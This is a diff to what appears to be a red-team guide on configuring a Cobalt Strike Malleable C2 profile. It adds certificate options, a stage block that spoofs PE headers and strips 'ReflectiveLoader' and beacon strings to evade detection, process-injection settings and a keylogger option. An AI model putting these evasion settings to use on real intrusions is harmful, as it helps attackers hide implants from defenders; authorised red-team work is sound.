@@ -1,6 +1,6 @@
 # Setup Malleable C2 Profile
 
-Search Tag: #red-team-infrastructure #cobalt-strike
+Search Tag(s): #red-team-infrastructure #cobalt-strike
 
 ## 01 - Generate TLS Keystore
 
@@ -73,6 +73,18 @@ code-signer {
 
 ```
 https-certificate {
+    # Option 1) Trusted and Signed Certificate
+    # Use keytool to create a Java Keystore file. 
+    # Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
+    # or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
+   
+    # Option 2) Create your own Self-Signed Certificate
+    # Use keytool to import your own self signed certificates
+
+    #set keystore "/path/to/keystore.store";
+    #set password "password";
+
+    # Option 3) Cobalt Strike Self-Signed Certificate
 	set C    "US"
 	set CN   "www.website.com";
 	set L    "San Francisco";
@@ -172,6 +184,63 @@ http-beacon "wininet-beacon-variant" {
 
 ```
 
+### Stage Block
+
+```
+stage {
+    set checksum       "0";
+    set compile_time   "27 Apr 2019 13:24:28";
+    set entry_point    "32308";
+    set image_size_x86 "1798144";
+    set image_size_x64 "1798144";
+    set name           "Dll6.dll";
+
+    set userwx          "false";
+    set cleanup         "true";
+    set sleep_mask      "true";
+    set stomppe         "true";
+    set obfuscate       "true";
+    set rich_header     "\x1d\x67\x43\x53\x59\x06\x2d\x00\x59\x06\x2d\x00\x59\x06\x2d\x00\x3c\x60\x29\x01\x4c\x06\x2d\x00\x3c\x60\x2e\x01\x49\x06\x2d\x00\x>
+
+    #set allocator "HeapAlloc";
+    set magic_mz_x86 "MZRE";
+    set magic_mz_x64 "MZAR";
+    set magic_pe "EA";
+
+    set sleep_mask "true";
+
+    set smartinject "true";
+
+    #set module_x86 "wwanmm.dll";
+    #set module_x64 "wwanmm.dll";
+
+    transform-x86 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.dll" "";
+        }
+
+    transform-x64 {
+        prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.x64.dll" "";
+        }
+
+	string "BAD BYTES";
+	string "{48 FF}";
+}
+```
+
+### Process Inject Block
+
+```
+process-inject {
+	set userwx "false";
+	
+	set startrwx "true";
+}
+```
+
 ### Post Exploitation Block (Evasion)
 
 ```
@@ -190,6 +259,7 @@ post-ex {
     set amsi_disable "false";
 
 	# Set a specific windows function for recording keystrokes
+	#set keylogger "SetWindowsHookEx";
 	set keylogger "GetAsyncKeyState";
 }
 ```
